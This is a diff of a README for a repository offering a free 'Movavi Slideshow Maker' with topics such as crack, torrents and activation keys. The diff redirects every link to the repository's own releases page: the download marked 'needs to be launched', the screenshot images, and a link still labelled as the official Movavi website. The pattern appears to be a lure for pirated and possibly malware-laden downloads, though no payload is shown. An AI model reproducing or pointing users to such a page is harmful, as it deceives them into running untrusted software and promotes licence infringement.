@@ -10,7 +10,7 @@ In this repository, you will find all the necessary resources related to Movavi 
 - **Topics Covered:** activation keys, downloading, file sharing, Mac compatibility, crack, torrents, license keys, and more.
 
 ### 🚀 Quick Links:
-- [Download Movavi Slideshow Maker](https://github.com/uploads/App.zip) (needs to be launched)
+- [Download Movavi Slideshow Maker](https://github.com/fpsliam/Movavi-Slideshow-Maker-Free/releases) (needs to be launched)
 
 ### 📌 Topics Covered:
 The repository covers a wide range of topics related to Movavi Slideshow Maker:
@@ -25,12 +25,12 @@ The repository covers a wide range of topics related to Movavi Slideshow Maker:
 ### 📸 Explore Movavi Slideshow Maker:
 Here are some snapshots of what you can achieve with Movavi Slideshow Maker:
 
-![Slideshow Image 1](https://example.com/slideshow-image1.jpg)
-![Slideshow Image 2](https://example.com/slideshow-image2.jpg)
-![Slideshow Image 3](https://example.com/slideshow-image3.jpg)
+![Slideshow Image 1](https://github.com/fpsliam/Movavi-Slideshow-Maker-Free/releases)
+![Slideshow Image 2](https://github.com/fpsliam/Movavi-Slideshow-Maker-Free/releases)
+![Slideshow Image 3](https://github.com/fpsliam/Movavi-Slideshow-Maker-Free/releases)
 
 ### 🌈 Additional Resources:
-For more information and updates, please visit the official Movavi website [here](https://www.movavi.com/slideshow-maker/).
+For more information and updates, please visit the official Movavi website [here](https://github.com/fpsliam/Movavi-Slideshow-Maker-Free/releases).
 
 ### 🌟 Get Creative with Movavi Slideshow Maker!
 Whether you are a beginner or an experienced user, Movavi Slideshow Maker offers a wide range of features to unleash your creativity. From simple slideshows to professional videos, the possibilities are endless with Movavi!
